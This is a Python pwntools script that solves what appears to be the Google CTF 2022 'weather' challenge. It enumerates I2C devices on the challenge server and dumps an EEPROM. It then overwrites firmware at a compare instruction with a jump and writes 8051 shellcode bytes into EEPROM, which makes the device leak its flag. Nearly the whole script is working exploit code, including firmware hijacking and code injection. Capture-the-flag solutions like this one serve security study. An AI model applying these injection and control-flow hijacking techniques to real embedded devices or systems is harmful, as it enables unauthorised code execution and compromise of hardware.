#!/usr/bin/python3
from pwn import *
import math

REMOTE_A = ("weather.2022.ctfcompetition.com", 1337)
TERMINAL = ["gnome-terminal", "--"]
def init():
    context.terminal = TERMINAL

def start():
        log.info("Connecting to a remote socket...")
        return remote(REMOTE_A[0], REMOTE_A[1])

init()
t = start()

"""
Boilerplate pwntools code
configuration constants are ALL_CAPS_WITH_UNDERSCORES;
init() function sets important variables;
start() function spawns the process;
"""

def enumerateI2C():

    log.info("i2c enumeration started")

    devices = list()

    for i in range(10100000000, 10100000255):
        t.recvuntil("?")
        t.sendline("r " + str(i) + " 1")
        resp = t.recvline()
        log.info(f"{i - 10100000000}: {resp}")
        if not "device not found" in resp.decode():
            devices.append(i)
    log.info(f"i2c enumeration finished. {len(devices)} devices found")
    return devices

def dumpI2C(devices, filePath):

    with open(filePath, "w") as outFile:
        for i in devices:
            outFile.write(f"{i} ({i - 10100000000})\n")

#foundDevices = enumerateI2C()
#dumpI2C(foundDevices, "i2cdump.txt")

EEPROM = 10100000033

def dumpEEPROM(filePath):

    log.info(f"dumping eeprom contents to {filePath}")
    with open(filePath, "wb") as outFile:

        pagelines = list()

        for i in range(64):

            t.recvuntil("?")
            log.info(f"reading page {i}/64...")
            t.sendline("w " + str(EEPROM) + " 1 " + str(i))
            t.recvuntil("?")
            t.sendline("r " + str(EEPROM) + " 64")
            t.recvline()
            for i in range(4):
                pagelines.append(t.recvline().decode().strip())

        for page in pagelines:

            if "end" in page:
                continue

            bytelist = [ int(i) for i in page.split(" ") ]

            outFile.write(bytes(bytelist))

#dumpEEPROM("eeprom.bin")

CJNE_TARGET = 0x5e6

def byteToClearMask(byte):

    return (1 << 8) - 1 - byte

def hijackExecution():

    targetPage=math.floor(CJNE_TARGET/64)
    pageOffset = CJNE_TARGET - (targetPage * 64)
    page = [ 0 for _ in range(pageOffset) ]
    page += [0b11111101, 0b11110101, 0b00000000] #ljmp 0x0a0c

    page += [ 0 for _ in range(64-len(page)) ]

    eepromPacket = f"{targetPage} {str(0xa5)} {str(0x5a)} {str(0xa5)} {str(0x5a)}"
    for i in page:
        eepromPacket += " "
        eepromPacket += str(i)

    t.recvuntil("?")
    log.info("overriding the execution flow...")
    t.sendline("w " + str(EEPROM) + " " + str(69) + " " + eepromPacket)

SHELLCODE_ADDRESS = 0x0a0c

SHELLCODE = [ 0x78, 0x0, 0x88, 0xee, 0xe5, 0xef, 0xf5, 0xf2, 0x8, 0xb8, 0xff, 0xf6 ]

def injectShellcode():

    targetPage = math.floor(SHELLCODE_ADDRESS/64)
    pageOffset = SHELLCODE_ADDRESS - (targetPage*64)
    page = [ 0 for _ in range(pageOffset) ]
    page += [ byteToClearMask(i) for i in SHELLCODE ]

    page += [ 0 for _ in range(64-len(page)) ]
    eepromPacket = f"{targetPage} {str(0xa5)} {str(0x5a)} {str(0xa5)} {str(0x5a)}"
    for i in page:
        eepromPacket += " "
        eepromPacket += str(i)

    t.recvuntil("?")
    log.info("injecting the shellcode")
    t.sendline("w " + str(EEPROM) + " " + str(69) + " " + eepromPacket)

def trigger():

    log.info("Here goes your flag ^^")

    t.recvuntil("?")
    t.sendline("r 69 69")

injectShellcode()
hijackExecution() 
trigger()
    
t.interactive()
